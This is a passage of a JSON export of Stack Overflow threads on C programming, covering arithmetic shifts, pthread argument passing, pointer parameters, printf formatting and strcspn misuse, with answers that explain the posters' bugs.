correct behaviour on all platforms, one could replace this simple function with multiple if-else conditions, resulting in poor program performance. (One must to treat an overflow of an integer and consider the case when the <code>numerator</code> is <code>INT_MIN</code>.)</p>\n\n<p>Therefore I ask, what is the best practice for implementation of the arithmetic right shift in C? Ideally, I'm looking for the construct that compiles into the same code<sup>1</sup> as the code fragment above while avoiding the implementation-defined behaviour.</p>\n\n<p><sup>1</sup> considering, e.g., gcc and x86-64 platform</p>\n\n<p><strong>UPDATE:</strong></p>\n\n<p>After some thought, I realized that I made an incorrect implication in the above question. Computing the floor function for negative numbers using an arithmetic shift doesn't make sense if the platform doesn't use two's complement. The goal is to implement the expression \u230a&nbsp;<em>a</em>&nbsp;/&nbsp;2<sup><em>b</em></sup>&nbsp;\u230b in a portable way.</p>\n"}, {"tags": ["c", "linux", "pthreads"], "comments": [{"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "edited": false, "score": 1, "creation_date": 1544627431, "post_id": 53745837, "comment_id": 94344270, "body": "As written, you have several <i><a href=\"https://www.geeksforgeeks.org/scope-rules-in-c/\" rel=\"nofollow noreferrer\">variable scope</a></i> problems.  This will contribute at least in part to the problems you are seeing"}, {"owner": {"reputation": 206047, "user_id": 126769, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/zBsgn.png?s=128&g=1", "display_name": "nos", "link": "https://stackoverflow.com/users/126769/nos"}, "edited": false, "score": 0, "creation_date": 1544627609, "post_id": 53745837, "comment_id": 94344373, "body": "Surely your main() increments <code>i</code> so when your threads later on goes and dereferences it in <code>*(int*)num</code> , they will see the incremented value, or they will see a garbage value/undefined behavior if your for loop has ended and <code>i</code> went out of scope.. (And there&#39;s a race condition as <code>i</code> in main is used without a mutex in main and all your other threads)"}], "answers": [{"comments": [{"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1544633758, "post_id": 53746322, "comment_id": 94348097, "body": "As far as the c draft standard n1570 is concerned: <i>6.2.4 Storage durations of objects 5 [...] The result of attempting to indirectly access an object with automatic storage duration from a thread other than the one with which the object is associated is implementation-defined.</i> Though I believe POSIX requires that threads be allowed to access other thread&#39;s stacks."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "reply_to_user": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1544635994, "post_id": 53746322, "comment_id": 94349305, "body": "That&#39;s a good observation, @EOF.  Inasmuch as the question is about pthreads, however, not C11 threads (to the extent that they differ) it is not clear to me to what extent, if any, that provision of C11 is relevant.  I have not found any analogous provision in POSIX."}], "tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": true, "score": 1, "last_activity_date": 1544628585, "creation_date": 1544628585, "answer_id": 53746322, "question_id": 53745837, "link": "https://stackoverflow.com/questions/53745837/what-happen-if-passing-the-address-of-the-stack-variable-to-the-pthread-function/53746322#53746322", "title": "What happen if passing the address of the stack variable to the pthread function?", "body": "<blockquote>\n  <p>But when I pass a stack variable's address to the thread function and the program just wait always.</p>\n</blockquote>\n\n<p>There is no inherent problem with passing an automatic variable's address to a thread function.  In fact, it's fairly common to do so.  There <em>is</em> a problem, however, with the thread function dereferencing the pointer after the lifetime of the pointed-to variable ends, and there may be a different kind of problem if the value of the pointed-to variable is changed by another thread, such as the parent thread.</p>\n\n<p>Your program exhibits both kinds of problems: it passes the address of local variable <code>i</code> and then changes the value of that variable, and <em>then</em> that variable's lifetime ends when the loop terminates, which can easily happen before the threads try to use the pointer.</p>\n\n<p>You could solve both problems with appropriate synchronization to ensure that the thread function reads the variable before the loop moves to the next iteration.  That would be a correct solution for every conforming implementation.</p>\n\n<p>It might be easier, however, to <em>convert</em> <code>i</code> to a pointer, pass the result, and have the thread function convert it back.  Both conversions exhibit implementation-defined behavior, but in practice, this works fine on most systems.  Your implementation's documentation should provide sufficient detail to determine whether it supports that approach, if you want to be certain.</p>\n\n<p>For example:</p>\n\n<pre><code>    // Note that 'i' itself is converted to void *\n    int success = pthread_create(&amp;p_id[i], NULL, thread_print, (void *) i);\n    // ...\n\nvoid *thread_print(void *num) {\n    // Note that 'num' is converted directly (back) to an int, not dereferenced\n    int number = (int) num;\n    // ...\n</code></pre>\n\n<p>Note, too, that <code>sleep()</code> does not solve synchronization problems.  It best, it hides them, but in your particular case it accentuates them.</p>\n"}], "owner": {"reputation": 15, "user_id": 7086221, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/10dc7502c56226356c2f53c52df4ccd2?s=128&d=identicon&r=PG&f=1", "display_name": "windyear", "link": "https://stackoverflow.com/users/7086221/windyear"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 117, "favorite_count": 0, "accepted_answer_id": 53746322, "answer_count": 1, "score": 0, "last_activity_date": 1544628585, "creation_date": 1544626972, "question_id": 53745837, "link": "https://stackoverflow.com/questions/53745837/what-happen-if-passing-the-address-of-the-stack-variable-to-the-pthread-function", "title": "What happen if passing the address of the stack variable to the pthread function?", "body": "<p>I write a program to let the threads executes orderly.But when I pass a stack variable's address to the thread function and the program just wait always.Here is the program:</p>\n\n<pre><code>#include &lt;pthread.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\npthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;\npthread_cond_t order_cond = PTHREAD_COND_INITIALIZER;\nint count = 0;\n\nvoid* thread_print(void* num){\n    sleep(10);\n    int number = *(int*)num;\n    //printf(\"%d\", number);\n    for(int i = 0; i &lt; 10; i++){\n        pthread_mutex_lock(&amp;mutex);\n        while((count%3)!=number){\n            pthread_cond_wait(&amp;order_cond, &amp;mutex);\n        }\n        switch(number){\n            case 0:{\n                printf(\"A\");\n                break;\n            }\n            case 1:{\n                printf(\"B\");\n                break;\n            }\n            case 2:{\n                printf(\"C\");\n                break;\n            }\n        }\n        count++;\n        pthread_mutex_unlock(&amp;mutex);\n        pthread_cond_broadcast(&amp;order_cond);\n    }\n    return (void*)0;\n}\n\nint main(){\n    pthread_t p_id[3];\n    printf(\"fail\\n\");\n    void* tret;\n    for(int i = 0; i&lt;3;i++){\n        int success = pthread_create(&amp;p_id[i], NULL, thread_print, (void*)&amp;i);\n        if(success != 0){\n            printf(\"fail\\n\");\n        }\n    }\n    for(int i = 0; i &lt; 3; i++){\n        pthread_join(p_id[i], &amp;tret);\n    }\n    //sleep(10);\n    pthread_mutex_lock(&amp;mutex);\n    while(count &lt; 30){\n        pthread_cond_wait(&amp;order_cond, &amp;mutex);\n    }\n    pthread_mutex_unlock(&amp;mutex);\n    return 0;\n}\n</code></pre>\n\n<p>I make some effort.When I pass the i to the thread function and <code>use int number = (int)num</code>, it can works very well.\nSo what happen when I just pass the address of i to the thread function?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1544626571, "post_id": 53745707, "comment_id": 94343761, "body": "Warning, you;re storing the address of a local variable, which is not of static storage duration!!"}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 2, "creation_date": 1544626651, "post_id": 53745707, "comment_id": 94343815, "body": "You have set <code>p = &amp;x;</code> and then modify what it is pointed to with <code>*p=x;</code> That will modify <code>x</code>, not <code>*p</code>."}, {"owner": {"reputation": 13, "user_id": 7269285, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-0_rDjvbfUxw/AAAAAAAAAAI/AAAAAAAAABs/Db4PwAGKxqU/photo.jpg?sz=128", "display_name": "Yamen Massalha", "link": "https://stackoverflow.com/users/7269285/yamen-massalha"}, "reply_to_user": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1544626665, "post_id": 53745707, "comment_id": 94343823, "body": "What should I do to fix it? @SouravGhosh"}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 1, "creation_date": 1544626714, "post_id": 53745707, "comment_id": 94343856, "body": "You should remove the line <code>p = &amp;x;</code>"}, {"owner": {"reputation": 13, "user_id": 7269285, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-0_rDjvbfUxw/AAAAAAAAAAI/AAAAAAAAABs/Db4PwAGKxqU/photo.jpg?sz=128", "display_name": "Yamen Massalha", "link": "https://stackoverflow.com/users/7269285/yamen-massalha"}, "reply_to_user": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1544626806, "post_id": 53745707, "comment_id": 94343911, "body": "@PaulOgilvie , Same problem"}, {"owner": {"reputation": 13, "user_id": 7269285, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-0_rDjvbfUxw/AAAAAAAAAAI/AAAAAAAAABs/Db4PwAGKxqU/photo.jpg?sz=128", "display_name": "Yamen Massalha", "link": "https://stackoverflow.com/users/7269285/yamen-massalha"}, "edited": false, "score": 0, "creation_date": 1544626956, "post_id": 53745707, "comment_id": 94344002, "body": "Fixed, thank you all"}], "answers": [{"tags": [], "owner": {"reputation": 58292, "user_id": 34824, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/ri8DI.jpg?s=128&g=1", "display_name": "abelenky", "link": "https://stackoverflow.com/users/34824/abelenky"}, "is_accepted": false, "score": 1, "last_activity_date": 1544626957, "creation_date": 1544626957, "answer_id": 53745830, "question_id": 53745707, "link": "https://stackoverflow.com/questions/53745707/how-can-i-change-an-int-value-using-function-and-pointer-in-c/53745830#53745830", "title": "How can I change an int value using function and pointer in C", "body": "<p>This code demonstrates the right way, and the wrong way to change a number.</p>\n\n<p>The function <code>get_number_A</code> will NOT make a meaningful change to its parameter, because C uses \"pass-by-copy\" for its parameters.</p>\n\n<p>The function <code>get_number_B</code> will make a meaningful change to its parameter, because a pointer to the variable is passed.</p>\n\n<pre><code>void get_number_A(int x)\n{\n    x = 5; // This change will NOT happen outside of this function.\n}\n\nvoid get_number_B(int* p)\n{\n    *p = 7; // This change will happen outside of this function.\n}\n\nint main(void)\n{\n    int number = 0;\n\n    get_number_A(number);\n    printf(\"A.) The number is: %d; it was NOT modified.\\n\", number);\n\n    get_number_B(&amp;number);\n    printf(\"B.) The number is: %d; it was SUCCESSFULLY modified.\\n\", number);\n\n    return 0;\n}\n</code></pre>\n\n<p><a href=\"https://ideone.com/MCr8Qa\" rel=\"nofollow noreferrer\">View this code on IDEOne</a></p>\n"}], "owner": {"reputation": 13, "user_id": 7269285, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-0_rDjvbfUxw/AAAAAAAAAAI/AAAAAAAAABs/Db4PwAGKxqU/photo.jpg?sz=128", "display_name": "Yamen Massalha", "link": "https://stackoverflow.com/users/7269285/yamen-massalha"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 84, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1544626957, "creation_date": 1544626496, "question_id": 53745707, "link": "https://stackoverflow.com/questions/53745707/how-can-i-change-an-int-value-using-function-and-pointer-in-c", "title": "How can I change an int value using function and pointer in C", "body": "<pre><code>    int boom_number;\n    get_boom_number(boom_number);\n    void get_boom_number(int *p)\n{\n    int x;\n    p = &amp;x;\n    if(scanf(\"%d\",&amp;x)== 0)\n        printf(\"Input Error!\");\n    else\n        *p = x;\n    return;\n}\n</code></pre>\n\n<p>I wan't to change the p value to the value that I scanned, what's wrong with my code?</p>\n"}, {"tags": ["c", "formatting", "printf"], "comments": [{"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 2, "creation_date": 1544626432, "post_id": 53745664, "comment_id": 94343666, "body": "Read about the format specifier of printf. It is all there..."}, {"owner": {"reputation": 19856, "user_id": 2266772, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/60e03bd1fd9f2dbc750e0899b9e7e71d?s=128&d=identicon&r=PG", "display_name": "Matthieu Brucher", "link": "https://stackoverflow.com/users/2266772/matthieu-brucher"}, "edited": false, "score": 3, "creation_date": 1544626530, "post_id": 53745664, "comment_id": 94343725, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/35121029/printf-a-float-value-with-precision-number-of-decimal-digits-passed-in-a-varia\">printf a float value with precision (number of decimal digits) passed in a variable</a>"}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 1, "creation_date": 1544626531, "post_id": 53745664, "comment_id": 94343727, "body": "And I understand you just want to print a bunch of zeroes, even when the digits are actually <i>not</i> zero. That would give the user the impression the answer printed is exact up to all digits printed when actually it is <i>not</i>. That is bad practice."}, {"owner": {"reputation": 97942, "user_id": 25324, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c812d568dcbf02b96796728be3cac626?s=128&d=identicon&r=PG", "display_name": "pmg", "link": "https://stackoverflow.com/users/25324/pmg"}, "edited": false, "score": 2, "creation_date": 1544626556, "post_id": 53745664, "comment_id": 94343746, "body": "Why did you use <code>&quot;%.2f&quot;</code>? Maybe the answer to this question answers <b>your</b> question :)"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1544628003, "post_id": 53745664, "comment_id": 94344583, "body": "Priyam Sharma, What input do you use to get &quot;output is 12.566371&quot;"}, {"owner": {"reputation": 97942, "user_id": 25324, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c812d568dcbf02b96796728be3cac626?s=128&d=identicon&r=PG", "display_name": "pmg", "link": "https://stackoverflow.com/users/25324/pmg"}, "edited": false, "score": 0, "creation_date": 1544629746, "post_id": 53745664, "comment_id": 94345719, "body": "After the edit: try <code>&quot;%.2f0000&quot;</code>"}, {"owner": {"reputation": 19, "user_id": 10781460, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d8d34d5389b5a1dde8a4ecb5c4c8cbbd?s=128&d=identicon&r=PG&f=1", "display_name": "Priyam Sharma", "link": "https://stackoverflow.com/users/10781460/priyam-sharma"}, "edited": false, "score": 1, "creation_date": 1544631734, "post_id": 53745664, "comment_id": 94346956, "body": "-pmg Thanks it worked -kvantour Printing in the format i described is mandatory for the question i was solving.It is part of college programming  lab."}], "answers": [{"comments": [{"owner": {"reputation": 19, "user_id": 10781460, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d8d34d5389b5a1dde8a4ecb5c4c8cbbd?s=128&d=identicon&r=PG&f=1", "display_name": "Priyam Sharma", "link": "https://stackoverflow.com/users/10781460/priyam-sharma"}, "edited": false, "score": 0, "creation_date": 1544629523, "post_id": 53746271, "comment_id": 94345561, "body": "Thanks it worked.Can you tell how to print only 2 digits after decimal without rounding off i.e. exactly 2 digits from answer. eg. answer is 12.566371 but i want 12.56 only not 12.560000"}, {"owner": {"reputation": 19, "user_id": 10781460, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d8d34d5389b5a1dde8a4ecb5c4c8cbbd?s=128&d=identicon&r=PG&f=1", "display_name": "Priyam Sharma", "link": "https://stackoverflow.com/users/10781460/priyam-sharma"}, "edited": false, "score": 0, "creation_date": 1544629981, "post_id": 53746271, "comment_id": 94345870, "body": "Thanks I understood the code.Now I wam able to get the correct output!"}, {"owner": {"reputation": 19, "user_id": 10781460, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d8d34d5389b5a1dde8a4ecb5c4c8cbbd?s=128&d=identicon&r=PG&f=1", "display_name": "Priyam Sharma", "link": "https://stackoverflow.com/users/10781460/priyam-sharma"}, "edited": false, "score": 0, "creation_date": 1544631421, "post_id": 53746271, "comment_id": 94346769, "body": "Initially I was using the value of Pi from math module and getting output 2.57.. but when I used the value of pi=3.14 I got the answer as 2.56.."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 19, "user_id": 10781460, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d8d34d5389b5a1dde8a4ecb5c4c8cbbd?s=128&d=identicon&r=PG&f=1", "display_name": "Priyam Sharma", "link": "https://stackoverflow.com/users/10781460/priyam-sharma"}, "edited": false, "score": 0, "creation_date": 1544631866, "post_id": 53746271, "comment_id": 94347031, "body": "@PriyamSharma  A portable way to determine machine pi (\u03c0 to the best that system provides) is to do a one time calculation of  <code>pi = acos(-1.0);</code>.  Still, I find using a constant with twice the expected decimals needed robust for current and subsequent applications.  Using <code>3.14</code> is not a good approach."}], "tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": true, "score": 2, "last_activity_date": 1544633475, "last_edit_date": 1544633475, "creation_date": 1544628426, "answer_id": 53746271, "question_id": 53745664, "link": "https://stackoverflow.com/questions/53745664/how-to-add-zeros-after-the-significant-digits-after-decimal-in-c/53746271#53746271", "title": "How to add zeros after the significant digits after decimal in C?", "body": "<blockquote>\n  <p>... total 6 digits after decimal but only 2 digits from original answer and the remaining digits to be 0.</p>\n</blockquote>\n\n<p>Print the rounded answer to the desired precision and then print the zeros with <code>\"%0*d\", zeros, 0</code>.</p>\n\n<p>Or post process text to get an un-rounded output.</p>\n\n<pre><code>#include &lt;math.h&gt;\n#include &lt;stdio.h&gt;\n#ifndef M_PI\n#define M_PI 3.1415926535897932384626433832795\n#endif\n\nint main() {\n  double r = 2.0;\n  double a = M_PI * pow(r, 2);\n\n  int total_digits_after_decimal = 6;\n  int zeros = 4;\n  printf(\"%.*f%0*d\\n\", total_digits_after_decimal - zeros, a, zeros, 0);\n\n  char buf[4096];\n  int len = sprintf(buf, \"%.*f\", total_digits_after_decimal, a);\n  buf[len - zeros] = '\\0';\n  printf(\"%s%0*d\\n\", buf, zeros, 0);\n\n  return 0;\n}\n</code></pre>\n\n<p>Output</p>\n\n<pre><code>12.570000\n12.560000\n</code></pre>\n\n<hr>\n\n<p>Note: The approach of <code>printf(\"%.*f\",6,trunc(a*100)/100);</code> works for many values of <code>a</code> yet fails when <code>a</code> is very large and for select values when <code>a*100</code> is inexact and near a whole number value.</p>\n\n<hr>\n\n<p>The usually challenges occur of how to handle infinite and not-a-number.</p>\n\n<p>The buffer size worst case could use <code>DBL_MAX_10_EXP</code> (often 308) to right size <code>buf[]</code>.</p>\n\n<pre><code>#include &lt;float.h&gt;\n//     sign        digits     .             precision         \\0\nchar buf[1 + DBL_MAX_10_EXP + 1 + total_digits_after_decimal + 1];\n</code></pre>\n\n<hr>\n\n<p>Deeper:</p>\n\n<p>The post processed approach still rounds the answer but at the 6th decimal place rather than the 2nd.</p>\n\n<p>To incur no rounding, the precision needs to extend out about at least <code>DBL_DECIMAL_DIG</code> (C11) places or <code>total_digits_after_decimal + 1</code> - which ever is greater.  This insures text output is rounded beyond what might affect things.</p>\n\n<pre><code>  int len = sprintf(buf, \"%.*f\", DBL_DECIMAL_DIG, a);\n  buf[len - DBL_DECIMAL_DIG - (total_digits_after_decimal - zeros)] = '\\0';\n  printf(\"%s%0*d\\n\", buf, zeros, 0);\n</code></pre>\n\n<hr>\n\n<p>Take heed of <a href=\"https://stackoverflow.com/questions/53745664/how-to-add-zeros-after-the-significant-digits-after-decimal-in-c-programming-lan/53746271#comment94343727_53745664\">@Paul Ogilvie</a> good advice.  The coding goal here is questionable for production code.</p>\n\n<p>Users like <a href=\"https://stackoverflow.com/questions/53745664/how-to-add-zeros-after-the-significant-digits-after-decimal-in-c-programming-lan/53746271#comment94346341_53745664\">@kvantour</a> echo the questionable need for this curious goal.</p>\n"}], "owner": {"reputation": 19, "user_id": 10781460, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d8d34d5389b5a1dde8a4ecb5c4c8cbbd?s=128&d=identicon&r=PG&f=1", "display_name": "Priyam Sharma", "link": "https://stackoverflow.com/users/10781460/priyam-sharma"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 818, "favorite_count": 0, "accepted_answer_id": 53746271, "answer_count": 1, "score": -5, "last_activity_date": 1544633475, "creation_date": 1544626346, "last_edit_date": 1544633168, "question_id": 53745664, "link": "https://stackoverflow.com/questions/53745664/how-to-add-zeros-after-the-significant-digits-after-decimal-in-c", "title": "How to add zeros after the significant digits after decimal in C?", "body": "<pre><code>double r;\nfloat a;\nscanf(\"%lf\",&amp;r);\na=M_PI*pow(r,2);\nprintf(\"%.*f\",6,a);\n</code></pre>\n\n<p>The output is 12.566371<br>\nbut I want the output like this 12.560000.  </p>\n\n<p>So I want total 6 digits after decimal but only 2 digits from original answer and the remaining digits to be 0.</p>\n"}, {"tags": ["c", "for-loop"], "comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1544630707, "post_id": 53745657, "comment_id": 94346354, "body": "Your loop is fragile because of the 53 when the array has 4 entries, but presumably that&#39;s because you removed many cards from the deck to make an MCVE."}], "answers": [{"comments": [{"owner": {"reputation": 6679, "user_id": 10622916, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21bd4eeaa5ba60dc021c5ccfbf4a963d?s=128&d=identicon&r=PG&f=1", "display_name": "Bodo", "link": "https://stackoverflow.com/users/10622916/bodo"}, "reply_to_user": {"reputation": 23, "user_id": 10781431, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-nqyj7EmbUL4/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-hcqVi3Z7dOh_KJsVnXN-2oCaGdiw/mo/photo.jpg?sz=128", "display_name": "Casey Pak", "link": "https://stackoverflow.com/users/10781431/casey-pak"}, "edited": false, "score": 0, "creation_date": 1544630065, "post_id": 53746207, "comment_id": 94345919, "body": "@CaseyPak It might be interesting for others to see your modified code that works now. And you might mark the answer as accepted."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1544634918, "post_id": 53746207, "comment_id": 94348636, "body": "Note that the <code>&amp;</code> in the <code>scanf()</code> is not required."}], "tags": [], "owner": {"reputation": 6679, "user_id": 10622916, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21bd4eeaa5ba60dc021c5ccfbf4a963d?s=128&d=identicon&r=PG&f=1", "display_name": "Bodo", "link": "https://stackoverflow.com/users/10622916/bodo"}, "is_accepted": true, "score": 2, "last_activity_date": 1544628199, "creation_date": 1544628199, "answer_id": 53746207, "question_id": 53745657, "link": "https://stackoverflow.com/questions/53745657/c-strcspn-function-skipping-over-the-longer-strings-in-my-array/53746207#53746207", "title": "C - strcspn() function skipping over the longer strings in my array", "body": "<p><code>strcspn</code> checks if the first string starts with any set of characters from the second string. When you type <code>10d</code> it will return 0 because the first string <code>\"1c\"</code> starts with a <code>'1'</code> which is the character you read with <code>scanf</code>. Maybe you should use <code>strcmp</code> or <code>strncmp</code> instead of <code>strspn</code>.</p>\n\n<p>There are several more problems in your code:</p>\n\n<p><code>char *input[10];</code> is an array of 10 pointers (<code>char*</code>). You probably mean an array of characters (a string), e.g. <code>char input[10];</code>. </p>\n\n<p>Format <code>%c</code> scans a single character only, not the whole string you type.\nMaybe <code>fgets</code> followed by removing <code>'\\n'</code> and <code>\\r'</code> characters is sufficient to read your input.</p>\n\n<p>The for loop can go beyond the end of the array. <code>x &lt; 53</code> should probably be <code>x &lt; 4</code>.</p>\n\n<p>With warnings enabled the compiler would probably warn you about some of the problems in your code. General recommendations: Enable compiler warnings and fix them. Read the documentation of the functions you are using.</p>\n"}], "owner": {"reputation": 23, "user_id": 10781431, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-nqyj7EmbUL4/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-hcqVi3Z7dOh_KJsVnXN-2oCaGdiw/mo/photo.jpg?sz=128", "display_name": "Casey Pak", "link": "https://stackoverflow.com/users/10781431/casey-pak"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 66, "favorite_count": 0, "accepted_answer_id": 53746207, "answer_count": 1, "score": 2, "last_activity_date": 1544630634, "creation_date": 1544626321, "last_edit_date": 1544630634, "question_id": 53745657, "link": "https://stackoverflow.com/questions/53745657/c-strcspn-function-skipping-over-the-longer-strings-in-my-array", "title": "C - strcspn() function skipping over the longer strings in my array", "body": "<p>I am trying to write a short function which takes a user input and returns the location of such input from an array.</p>\n\n<pre><code>int main(){\nchar *deck[5] = {\"1c\", \"4h\", \"7s\", \"10d\"};\nchar *input[10];\nscanf(\" %c\", &amp;input);\n    for (int x = 0; x &lt; 53;){\n        int check = strcspn(deck[x], input);\n        if (check == 0){\n            printf(\"%d\", x);\n            break;\n        }\n        else{\n            x++;\n            printf(\"why\\n\");\n        }\n    }\n}\n</code></pre>\n\n<p>It works for the first three (1c, 4h, 7s) and returns 0, 1 and 2 respectively, but when I type in 10d the function just returns 0 - not even printing out \"why\".</p>\n\n<p>Why does the loop return a 0 and how can I fix it?</p>\n"}, {"tags": ["c++", "c"], "comments": [{"owner": {"reputation": 19856, "user_id": 2266772, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/60e03bd1fd9f2dbc750e0899b9e7e71d?s=128&d=identicon&r=PG", "display_name": "Matthieu Brucher", "link": "https://stackoverflow.com/users/2266772/matthieu-brucher"}, "edited": false, "score": 4, "creation_date": 1544626136, "post_id": 53745558, "comment_id": 94343469, "body": "You need to cast it. But doesn&#39;t work if you are building in 64bits and warned strongly against in modern C++ compilers with the proper flags."}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 1, "creation_date": 1544626206, "post_id": 53745558, "comment_id": 94343516, "body": "<code>uintptr_t</code> is exactly for this purpose."}, {"owner": {"reputation": 16436, "user_id": 10411602, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2b534549770aedbc4d7eb03a39d740f6?s=128&d=identicon&r=PG&f=1", "display_name": "Blaze", "link": "https://stackoverflow.com/users/10411602/blaze"}, "edited": false, "score": 0, "creation_date": 1544626232, "post_id": 53745558, "comment_id": 94343535, 